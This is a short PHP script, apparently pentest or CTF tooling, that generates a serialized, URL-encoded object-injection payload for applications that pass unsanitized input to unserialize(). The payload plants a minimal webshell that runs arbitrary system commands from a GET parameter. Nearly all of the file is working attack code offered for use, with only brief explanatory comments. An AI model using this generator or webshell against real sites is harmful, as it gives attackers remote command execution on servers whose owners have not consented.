<?php

print "PHP Deserialization Payload Generator\n";
print "=====================================\n\n";

// When we have access to an unsanitized input that is passed to unserialize()
// and know of a class with a potentially dangerous _wakeup() or _destruct() function
// i.e. contains an eval() or sth. similar, we can create a payload to execute these functions.

// Class to instantiate
class FormSubmit {
	// these variables will be set in the instantiated class
	public $form_file = 'message.php';
	// example with a minimalized php webshell that might be injected somewhere
	public $message = '<html><body><form name="<?php echo basename($_SERVER["PHP_SELF"]); ?>"><input id="cmd"name="cmd"size="80"> <input type="SUBMIT"value="Execute"></form><pre><?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?></pre></body><script>document.getElementById("cmd").focus()</script></html>';
}

// Create payload that will be unserialized
$param = serialize(new FormSubmit);
print "Serialized:\n\n" . $param . "\n\n";

// Create URL valid payload for curl
print "Urlencoded:\n\n" . urlencode($param) . "\n";

?>
